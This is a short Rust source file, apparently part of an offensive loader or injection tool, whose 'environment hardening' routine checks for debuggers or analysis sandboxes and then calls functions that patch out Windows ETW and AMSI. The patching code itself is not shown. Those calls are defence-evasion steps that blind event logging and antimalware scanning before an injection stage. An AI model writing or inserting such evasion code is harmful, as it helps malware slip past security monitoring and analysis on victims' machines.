use crate::debug;

pub unsafe fn execute() -> bool {
    debug!("[INJECTION] Environment hardening");
    
    if !crate::core::anti_debug::is_safe_environment() {
        debug!("[INJECTION] Hostile environment detected");
        return false;
    }

    crate::core::etw::patch_etw();
    crate::core::amsi::patch_amsi();

    true    
}